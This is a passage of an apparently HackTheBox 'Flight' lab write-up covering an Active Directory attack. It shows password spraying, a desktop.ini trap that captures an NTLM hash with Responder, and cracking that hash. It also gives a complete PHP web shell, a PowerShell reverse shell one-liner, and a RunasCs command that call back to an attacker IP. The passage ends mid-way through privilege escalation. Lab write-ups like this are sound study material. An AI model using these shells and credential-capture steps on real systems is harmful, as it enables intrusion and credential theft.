     D        0  Fri Oct 21 13:50:21 2022\n\n        5056511 blocks of size 4096. 1190909 blocks available\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#finding-valid-users","title":"Finding valid users","text":"<p>Enumerate users and groups through smb using rid-brute-forcing</p> <pre><code>nxc smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --rid-brute\n</code></pre> <p>alternatively we could run the <code>--users</code> option for displaying the users only</p> <p>lets place them on a txt now</p> <pre><code>nxc smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --rid-brute | grep SidTypeUser | cut -d'\\' -f2 | cut -d' ' -f1 | tee users.txt\n</code></pre> <p>the valid users are:</p> <pre><code>Administrator\nGuest\nkrbtgt\nG0$\nS.Moon\nR.Cold\nG.Lors\nL.Kein\nM.Gold\nC.Bum\nW.Walker\nI.Francis\nD.Truff\nV.Stevens\nsvc_apache\nO.Possum\n</code></pre> <p>Also lets inspect if there are any comments with sensitive info in the LDAP description for the users:</p> <pre><code>nxc ldap flight.htb  -u 'svc_apache' -p 'S@Ss!K@*t13' --users\n</code></pre> <pre><code>SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nLDAP        10.129.228.120  389    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 \nLDAP        10.129.228.120  389    G0               [*] Total records returned: 15\nLDAP        10.129.228.120  389    G0               -Username-                    -Last PW Set-       -BadPW- -Description-                                               \nLDAP        10.129.228.120  389    G0               Administrator                 2022-09-22 20:17:02 22      Built-in account for administering the computer/domain      \nLDAP        10.129.228.120  389    G0               Guest                         &lt;never&gt;             22      Built-in account for guest access to the computer/domain    \nLDAP        10.129.228.120  389    G0               krbtgt                        2022-09-22 19:48:01 22      Key Distribution Center Service Account                     \nLDAP        10.129.228.120  389    G0               S.Moon                        2022-09-22 20:08:22 22      Junion Web Developer                                        \nLDAP        10.129.228.120  389    G0               R.Cold                        2022-09-22 20:08:22 22      HR Assistant                                                \nLDAP        10.129.228.120  389    G0               G.Lors                        2022-09-22 20:08:22 22      Sales manager                                               \nLDAP        10.129.228.120  389    G0               L.Kein                        2022-09-22 20:08:22 22      Penetration tester                                          \nLDAP        10.129.228.120  389    G0               M.Gold                        2022-09-22 20:08:22 22      Sysadmin                                                    \nLDAP        10.129.228.120  389    G0               C.Bum                         2022-09-22 20:08:22 22      Senior Web Developer                                        \nLDAP        10.129.228.120  389    G0               W.Walker                      2022-09-22 20:08:22 22      Payroll officer                                             \nLDAP        10.129.228.120  389    G0               I.Francis                     2022-09-22 20:08:22 22      Nobody knows why he's here                                  \nLDAP        10.129.228.120  389    G0               D.Truff                       2022-09-22 20:08:22 22      Project Manager                                             \nLDAP        10.129.228.120  389    G0               V.Stevens                     2022-09-22 20:08:22 22      Secretary                                                   \nLDAP        10.129.228.120  389    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web                                          \nLDAP        10.129.228.120  389    G0               O.Possum                      2022-09-22 20:08:23 22      Helpdesk    \n</code></pre> <p>No credentials found or any other useful info on the LDAP description</p>"},{"location":"ch3ckm8_HTB_Flight/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_Flight/#password-spraying","title":"Password spraying","text":"<p>using this wordlist</p> <p>We have our user list, and for our password spraying attempt we can use a very short list of statistically likely passwords. It's worth appending the discovered usernames to this list, as having a password of the username is unfortunately a common practice.</p> <pre><code>wget [https://raw.githubusercontent.com/insidetrust/statistically-likely-](https://raw.githubusercontent.com/insidetrust/statistically-likely-)usernames/master/weak-corporate-passwords/english-basic.txt\ncat users.txt &gt;&gt; english-basic.txt\n</code></pre> <p>Also add the password of <code>svc_apache</code> to check for <code>password reuse</code></p> <pre><code>echo 'S@Ss!K@*t13' &gt;&gt; english-basic.txt\n</code></pre> <p>now that we have the valid users, lets do some password spraying</p> <pre><code>nxc smb flight.htb-u users.txt -p english-basic.txt --continue-on-success\n</code></pre> <p>great! it appears that password reuse is taking place and user <code>S.Moon</code> had the same password as <code>svc_apache</code> ! creds obtained:</p> <pre><code>S.Moon\nS@Ss!K@*t13\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#checking-where-we-can-login-with-smoon-creds","title":"Checking where we can login with S.Moon creds","text":"<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</p> <pre><code>./auto_netexec_bulk_creds_checker.sh flight.htb 'S.Moon' 'S@Ss!K@*t13'\n</code></pre> <pre><code>[*] Checking if winrm port 5985 is open on flight.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.228.120  5985   G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)\nWINRM       10.129.228.120  5985   G0               [-] flight.htb\\S.Moon:S@Ss!K@*t13\n\n[*] Checking if smb port 445 is open on flight.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         10.129.228.120  445    G0               [+] flight.htb\\S.Moon:S@Ss!K@*t13 \n\n[*] Checking if ldap port 389 is open on flight.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nLDAP        10.129.228.120  389    G0               [+] flight.htb\\S.Moon:S@Ss!K@*t13 \n\n[*] Checking if rdp port 3389 is open on flight.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on flight.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.228.120  135    G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)\nRPC         10.129.228.120  135    G0               [+] flight.htb\\S.Moon:S@Ss!K@*t13 \n\n[*] Checking if nfs port 2049 is open on flight.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on flight.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on flight.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on flight.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on flight.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> <p>We can login towards <code>SMB</code> <code>LDAP</code> <code>RPC</code> services, here we go again\u2026</p>"},{"location":"ch3ckm8_HTB_Flight/#smb-enumeration-as-smoon","title":"SMB enumeration as S.Moon","text":"<pre><code>nxc smb flight.htb  -u 'S.Moon' -p 'S@Ss!K@*t13' --shares\n</code></pre> <pre><code>SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         10.129.228.120  445    G0               [+] flight.htb\\S.Moon:S@Ss!K@*t13 \nSMB         10.129.228.120  445    G0               [*] Enumerated shares\nSMB         10.129.228.120  445    G0               Share           Permissions     Remark\nSMB         10.129.228.120  445    G0               -----           -----------     ------\nSMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin\nSMB         10.129.228.120  445    G0               C$                              Default share\nSMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC\nSMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share \nSMB         10.129.228.120  445    G0               Shared          READ,WRITE      \nSMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share \nSMB         10.129.228.120  445    G0               Users           READ            \nSMB         10.129.228.120  445    G0               Web             READ\n</code></pre> <p>Thats different now, this user was also <code>WRITE</code> permissions to the share <code>Shared</code></p> <pre><code>smbclient //flight.htb/shared -U 's.moon%S@Ss!K@*t13'\n</code></pre> <p>First lets inspect the share,</p> <pre><code>smb: \\&gt; ls\n  .                                   D        0  Fri Aug 22 19:55:34 2025\n  ..                                  D        0  Fri Aug 22 19:55:34 2025\n\n        5056511 blocks of size 4096. 1189577 blocks available\n</code></pre> <p>it is empty</p>"},{"location":"ch3ckm8_HTB_Flight/#leaking-another-users-ntlm-hash","title":"Leaking another user\u2019s NTLM hash","text":"<p>but since we have <code>WRITE</code> permissions, we might have to upload sth there</p> <p>Found this: https://hacktricks.boitatech.com.br/windows/ntlm/places-to-steal-ntlm-creds#desktop.ini</p> <p>Create a file called <code>desktop.ini</code></p> <pre><code>echo [.ShellClassInfo] &gt; desktop.ini\necho 'IconResource=\\\\10.10.14.180\\thebestshareever' &gt;&gt; desktop.ini\n</code></pre> <p>Navigate to the share and upload the file:</p> <pre><code>smbclient //flight.htb/shared -U 's.moon%S@Ss!K@*t13'\nsmb: \\&gt; put desktop.ini\nputting file desktop.ini as \\desktop.ini (2.4 kb/s) (average 2.4 kb/s)\n</code></pre> <p>Now start the responder:</p> <pre><code>sudo responder -I tun0 -wP\n</code></pre> <p>then navigate to the share again:</p> <pre><code>\u2514\u2500\u2500\u257c [\u2605]$ smbclient //flight.htb/shared -U 's.moon%S@Ss!K@*t13'\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; \n</code></pre> <p>aand we got the NTLM hash of another user, <code>c.bum</code> !</p> <pre><code>[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.129.228.120\n[SMB] NTLMv2-SSP Username : flight.htb\\c.bum\n[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:17d5b761f4a33f2fn</code></pre> <p>Now similarly with what we did earlier, we have to crack it</p>"},{"location":"ch3ckm8_HTB_Flight/#cracking-ntlm-hash_1","title":"Cracking NTLM hash","text":"<p>place the hash on a file</p> <pre><code>echo 'c.bum::flight.htb:17d5b761f4a33f2f:5DB137F84725B322F1D060C8911A33C8:010100000000000080A156AD6613DC01DB53B3184F0649420000000002000800460057005300500001001E00570049004E002D0034005700540030004300450052004F0041005000430004003400570049004E002D0034005700540030004300450052004F004100500043002E0046005700530050002E004C004F00430041004C000300140046005700530050002E004C004F00430041004C000500140046005700530050002E004C004F00430041004C000700080080A156AD6613DC01060004000200000008003000300000000000000000000000003000005108C442C3741020BE0C1669030BA6011CB2E34E998B97B6DD2F82EF286BF89D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380030000000000000000000' &gt; cbum_hash\n</code></pre> <p>then use john to crack it:</p> <pre><code>john cbum_hash --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> <p>it was successful:</p> <pre><code>Using default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nTikkycoll_431012284 (c.bum)     \n1g 0:00:00:04 DONE (2025-08-22 13:18) 0.2127g/s 2241Kp/s 2241Kc/s 2241KC/s TinyMutt69..Tiffani29\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>creds obtained:</p> <pre><code>c.bum\nTikkycoll_431012284\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#checking-where-we-can-login-with-cbum-creds","title":"Checking where we can login with c.bum creds","text":"<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</p> <pre><code>./auto_netexec_bulk_creds_checker.sh flight.htb 'c.bum' 'Tikkycoll_431012284'\n</code></pre> <pre><code>[*] Checking if winrm port 5985 is open on flight.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.228.120  5985   G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)\nWINRM       10.129.228.120  5985   G0               [-] flight.htb\\c.bum:Tikkycoll_431012284\n\n[*] Checking if smb port 445 is open on flight.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         10.129.228.120  445    G0               [+] flight.htb\\c.bum:Tikkycoll_431012284 \n\n[*] Checking if ldap port 389 is open on flight.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nLDAP        10.129.228.120  389    G0               [+] flight.htb\\c.bum:Tikkycoll_431012284 \n\n[*] Checking if rdp port 3389 is open on flight.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on flight.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.228.120  135    G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)\nRPC         10.129.228.120  135    G0               [+] flight.htb\\c.bum:Tikkycoll_431012284 \n\n[*] Checking if nfs port 2049 is open on flight.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on flight.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on flight.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on flight.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on flight.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> <p>It seems we can login to:  <code>SMB</code> <code>LDAP</code> <code>RPC</code> services, lets enumerate further\u2026</p>"},{"location":"ch3ckm8_HTB_Flight/#smb-enumeration-as-cbum","title":"SMB enumeration as C.Bum","text":"<pre><code>nxc smb flight.htb  -u 'c.bum' -p 'Tikkycoll_431012284' --shares\n</code></pre> <pre><code>SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         10.129.228.120  445    G0               [+] flight.htb\\c.bum:Tikkycoll_431012284 \nSMB         10.129.228.120  445    G0               [*] Enumerated shares\nSMB         10.129.228.120  445    G0               Share           Permissions     Remark\nSMB         10.129.228.120  445    G0               -----           -----------     ------\nSMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin\nSMB         10.129.228.120  445    G0               C$                              Default share\nSMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC\nSMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share \nSMB         10.129.228.120  445    G0               Shared          READ,WRITE      \nSMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share \nSMB         10.129.228.120  445    G0               Users           READ            \nSMB         10.129.228.120  445    G0               Web             READ,WRITE\n</code></pre> <p>This user has <code>WRITE</code> access to the <code>Web</code> share, sth all the previously found user did not have, lets dive in</p> <pre><code>smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284'\n</code></pre> <p>inside there are 2 folders, each one containing the source code for each page we found on the web app earlier</p> <pre><code>smb: \\&gt; ls\n  .                                   D        0  Fri Aug 22 20:22:54 2025\n  ..                                  D        0  Fri Aug 22 20:22:54 2025\n  flight.htb                          D        0  Fri Aug 22 20:22:00 2025\n  school.flight.htb                   D        0  Fri Aug 22 20:22:00 2025\n\n        5056511 blocks of size 4096. 1188972 blocks available\n</code></pre> <p>The <code>flight.htb</code> folder contains:</p> <pre><code>smb: \\flight.htb\\&gt; ls\n  .                                   D        0  Fri Aug 22 20:22:00 2025\n  ..                                  D        0  Fri Aug 22 20:22:00 2025\n  css                                 D        0  Fri Aug 22 20:22:00 2025\n  images                              D        0  Fri Aug 22 20:22:00 2025\n  index.html                          A     7069  Wed Feb 23 23:58:10 2022\n  js                                  D        0  Fri Aug 22 20:22:00 2025\n\n        5056511 blocks of size 4096. 1188972 blocks available\n</code></pre> <p>The <code>school.flight.htb</code> contains:</p> <pre><code>smb: \\school.flight.htb\\&gt; ls\n  .                                   D        0  Fri Aug 22 20:22:00 2025\n  ..                                  D        0  Fri Aug 22 20:22:00 2025\n  about.html                          A     1689  Mon Oct 24 22:54:45 2022\n  blog.html                           A     3618  Mon Oct 24 22:53:59 2022\n  home.html                           A     2683  Mon Oct 24 22:56:58 2022\n  images                              D        0  Fri Aug 22 20:22:00 2025\n  index.php                           A     2092  Thu Oct 27 02:59:25 2022\n  lfi.html                            A      179  Thu Oct 27 02:55:16 2022\n  styles                              D        0  Fri Aug 22 20:22:00 2025\n\n        5056511 blocks of size 4096. 1188972 blocks available\n</code></pre> <p>Since we have <code>WRITE</code> permissions on the whole share, we can similarly upload sth here, maybe sth like a reverse shell.</p> <p>What kind of revshell tho? hmm lets think smart here, these directories belong to the webapp, and the webapp runs also php.</p> <p>So any php file we upload there will be executed, this should be our goal, uploading a php revshell.</p> <p>found this php shell: <code>php_cmd</code> from reverse shell generator, and also powershell#2 for the rev shell, then started listener and got shell:</p>"},{"location":"ch3ckm8_HTB_Flight/#uploading-web-shell","title":"Uploading web shell","text":"<p>From smb client</p> <pre><code>smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284'\n</code></pre> <p>upload the php webshell using the \u201cput\u201d command on <code>flight.htb</code> or <code>school.flight.htb</code></p> <pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;form method=\"GET\" name=\"&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;\"&gt;\n&lt;input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"&gt;\n&lt;input type=\"SUBMIT\" value=\"Execute\"&gt;\n&lt;/form&gt;\n&lt;pre&gt;\n&lt;?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?&gt;\n&lt;/pre&gt;\n&lt;/body&gt;\n&lt;script&gt;document.getElementById(\"cmd\").focus();&lt;/script&gt;\n&lt;/html&gt;\n</code></pre> <p>once prompted with command line while accessing the phpshell from browser, </p> <p></p> <p>execute this</p> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.180',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <p>started listerner</p> <pre><code>nc -lvnp 9001\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#shell-as-svc_apache","title":"Shell as svc_apache","text":"<p>and got a shell as svc_apache</p> <p></p>"},{"location":"ch3ckm8_HTB_Flight/#user-privileges-svc_apache","title":"User privileges (svc_apache)","text":"<pre><code>whoami /all\n</code></pre> <pre><code>Privilege Name                Description                    State   \n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled \nSeCreateGlobalPrivilege       Create global objects          Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n</code></pre> <p>Those privileges do not help us</p>"},{"location":"ch3ckm8_HTB_Flight/#group-membership-of-svc_apache","title":"Group membership of svc_apache","text":"<pre><code>net user svc.apache\n</code></pre> <pre><code>User name                    svc_apache\nFull Name                    \nComment                      Service Apache web\nUser's comment               \nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            9/22/2022 1:08:23 PM\nPassword expires             Never\nPassword changeable          9/23/2022 1:08:23 PM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script                 \nUser profile                 \nHome directory               \nLast logon                   8/23/2025 12:32:30 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships      \nGlobal Group memberships     *Domain Users         \nThe command completed successfully.\n</code></pre> <p>Nothing interesting, lets check other users:</p>"},{"location":"ch3ckm8_HTB_Flight/#group-membership-of-cbum","title":"Group membership of C.Bum","text":"<pre><code>net user c.bum\n</code></pre> <pre><code>User name                    C.Bum\nFull Name                    \nComment                      Senior Web Developer\nUser's comment               \nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            9/22/2022 1:08:47 PM\nPassword expires             Never\nPassword changeable          9/23/2022 1:08:47 PM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script                 \nUser profile                 \nHome directory               \nLast logon                   9/22/2022 2:50:24 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships      \nGlobal Group memberships     *Domain Users         *WebDevs              \nThe command completed successfully.\n</code></pre> <p>Interesting, this user is member of <code>WebDevs</code> and the comment is <code>Senior Web Developer</code> lets keep that in mind for later.</p>"},{"location":"ch3ckm8_HTB_Flight/#impersonate-cbum-as-svc_apache","title":"Impersonate C.Bum as svc_apache","text":"<p>Those privileges and group membership does not provide any obvious attack path, but lets take a moment here and think, what we already know?</p> <ul> <li>We currently have shell as <code>svc_apache</code></li> <li>We know the password of another user (C.Bum)</li> </ul> <p>Based on those 2 statements, we meet the requirements to impersonate user C.Bum! So when we have access to one user, and know the creds of another one we can impersonate that user. </p> <p>Why does this work?</p> <ul> <li>There is a logon feature called \"logon with supplied credentials\u201d, where basically If you can type the correct password, Windows will create a new logon session under that user and spawn the requested process.</li> <li>One tool that can achieve that is <code>Runas</code><ul> <li>It just performs a normal secondary logon with the supplied credentials.</li> <li>The new process runs in the security context of the target user.</li> <li>You don\u2019t \"impersonate\" at the token level (thread-level impersonation) \u2014 you\u2019re logging on as them for a new process.</li> <li>If the account has the \"Deny log on locally\" or \"Deny log on through Remote Desktop\" rights applied, then <code>runas</code> will fail because Windows enforces those logon restrictions.<ul> <li> <p>For example:</p> </li> </ul> </li> </ul> </li> </ul> <p>Download runas</p> <pre><code>wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/RunasCs.cs\n</code></pre> <p>Get runas from the attacker machine</p> <pre><code>powershell -c wget 10.10.14.180:900/RunasCs.cs -outfile RunasCs.cs\n</code></pre> <p>or just upload it from smbclient earlier (much easier)</p> <pre><code>put RunasCs.cs\n</code></pre> <p>Run runas</p> <pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs\n.\\RunasCs.exe c.bum Tikkycoll_431012284 whoami\n</code></pre> <p>then on another shell execute whoami, lets create a connection towards our host and catch the reverse shell</p> <pre><code>.\\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.180:4444\n</code></pre> <pre><code>rlwrap nc -lvnp 4444 \n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#1-what-runas-does","title":"\ud83d\udd39 1. What <code>runas</code> does","text":"<ul> <li>When you run <code>runas /user:DOMAIN\\User cmd.exe</code> and type a password:<ul> <li>Windows calls <code>LogonUser()</code> with those credentials.</li> <li>If successful, a new logon session and new primary token for that user is created.</li> <li>Then Windows calls <code>CreateProcessAsUser()</code> to start a process under that token.</li> </ul> </li> </ul> <p>\ud83d\udc49 This means the process (e.g. <code>cmd.exe</code>) is running as that user, with their primary token.</p> <p>This is not impersonation at all \u2014 it\u2019s just process creation under a different user.</p>"},{"location":"ch3ckm8_HTB_Flight/#2-what-impersonation-means-in-windows","title":"\ud83d\udd39 2. What \u201cimpersonation\u201d means in Windows","text":"<ul> <li>Impersonation in Windows is a thread-level concept:<ul> <li>A thread temporarily \u201cborrows\u201d another user\u2019s access token to act on their behalf.</li> <li>For example, a web server thread impersonates a client so it can access files on their behalf.</li> </ul> </li> <li>This requires <code>SeImpersonatePrivilege</code> (or in older cases <code>SeAssignPrimaryTokenPrivilege</code>) to be useful in arbitrary scenarios.</li> </ul> <p>\ud83d\udc49 This is called token impersonation, not process-level logon.</p>"},{"location":"ch3ckm8_HTB_Flight/#3-process-level-impersonation","title":"\ud83d\udd39 3. Process-level impersonation?","text":"<ul> <li>The term \u201cprocess-level impersonation\u201d isn\u2019t official in Windows.</li> <li>What people sometimes mean by it is: \u201ca whole process runs as another user\u201d.</li> <li>But in Windows terms, that is not \u201cimpersonation\u201d \u2014 it is just running a process with a different primary token (via <code>runas</code>, scheduled tasks, <code>CreateProcessWithLogonW</code>, etc.).</li> </ul> <p>\u2705  runas vs impersonation:</p> <ul> <li><code>runas</code> = new process with another user\u2019s primary token (not impersonation).</li> <li>Impersonation = a thread borrows another user\u2019s token temporarily (requires <code>SeImpersonatePrivilege</code>).</li> <li>To conclude, If you (with permission) have a password for another account, you can <code>runas</code> it regardless of your current privilege level \u2014 unless Group Policy explicitly restricts local logon.</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#shell-as-cbum","title":"Shell as C.Bum","text":"<p>successful! got user flag: <code>4b75d3d79195394f018dccff2ef81592</code></p> <p>proof:</p> <p></p> <p>that was really tough.. lets move on to privesc</p>"},{"location":"ch3ckm8_HTB_Flight/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_Flight/#investigating-the-filesystem","title":"Investigating the filesystem","text":"<p>Lets navigate to the filesystem to check for anything usefull:</p> <p>The <code>C:</code> directory:</p> <pre><code>    Directory: C:\\\n\nMode                LastWriteTime         Length Name                                                                  \n----                -------------         ------ ----                                                                  \nd-----        8/23/2025   2:27 PM                inetpub                                                               \nd-----         6/7/2022   6:39 AM                PerfLogs                                                              \nd-r---       10/21/2022  11:49 AM                Program Files                                                         \nd-----        7/20/2021  12:23 PM                Program Files (x86)                                                   \nd-----       10/28/2022   1:21 PM                Shared                                                                \nd-----        9/22/2022  12:28 PM                StorageReports                                                        \nd-r---        9/22/2022   1:16 PM                Users                                                                 \nd-----       10/21/2022  11:52 AM                Windows                                                               \nd-----        9/22/2022   1:16 PM                xampp \n</code></pre> <p>when we got the shell initially as svc_apache, we where inside <code>xampp</code> folder in this path: \u201c\"C:\\xampp\\htdocs\\school.flight.htb\\\u201d. The xampp folder inside has multiple xampp related files and i found nothing interesting there</p> <p>Regarding the <code>Users</code> folder, it contains the user directories, i can only access svc_apache\u2019s and inside i found nothing of value.</p> <p>As for other folders like <code>PerfLogs</code>, <code>Program Files &amp; (86)</code> , <code>Shared</code> , <code>StorageReports</code> , <code>Windows</code> nothing useful was found</p> <p>Last but not least, i noticed the presence of <code>inetpub</code> folder, which indicates that IIS (Internet Information Services) has been installed, we will keep that in mind for later.</p> <p>For now, lets run winpeas to see if it we can find sth more helpful, or even find more information about that IIS server running</p>"},{"location":"ch3ckm8_HTB_Flight/#using-winpeas","title":"Using winpeas","text":"<p>Upload winpeas on this dir \u201cC:\\xampp\\htdocs\\flight.htb\u201d</p> <pre><code>powershell -c wget 10.10.14.180:800/winPEAS.ps1 -outfile winPEAS.ps1\n</code></pre> <p>or we could just upload it via the smbclient session we had earlier (easier)</p> <pre><code>put winPEAS.ps1\n</code></pre> <p>For some reason, even tho i run it on the shell, the results were printed on the webshell, also it took a while to run so be patient.</p> <p>From the very large output, nothing stood out more than the listening ports, thus i decided to focus there especially due to the fact that we earlier found indicators of the presence of an IIS server running, and one of those ports below could be used by that server.</p> <p></p>"},{"location":"ch3ckm8_HTB_Flight/#listening-ports","title":"Listening ports","text":"<p>Lets take a more detailed look at the listening ports via this command:</p> <pre><code>netstat -ano | findstr LISTENING\n</code></pre> <p>PROTOCOL  LOCAL ADDRESS  Foreign Address  State  PID</p> <pre><code>TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5284\nTCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912\nTCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5284\nTCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\nTCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:593            0.0.0.0:0              LISTENING       912\nTCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4\nTCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4\nTCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2980\nTCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4\nTCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       488\nTCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1204\nTCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1744\nTCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648\nTCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628\nTCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       3028\nTCP    0.0.0.0:49725          0.0.0.0:0              LISTENING       3052\n</code></pre> <p>What is our goal here?? First i found some interesting stuff about <code>PID = 4</code></p>"},{"location":"ch3ckm8_HTB_Flight/#pid-4-in-windows","title":"PID 4 in Windows","text":"<ul> <li>PID <code>4</code> is the System process (the kernel).</li> <li>When you see <code>netstat -ano</code> or <code>Get-NetTCPConnection</code> showing PID 4, it usually means a kernel driver or Windows component is the actual socket owner.</li> <li>Example: SMB (port 445), RPC, or even some HTTP listeners (HTTP.sys) can appear as PID 4.</li> </ul> <p>But which port corresponds to the IIS server? how can we know without doing port forwarding and navigating to the webpage 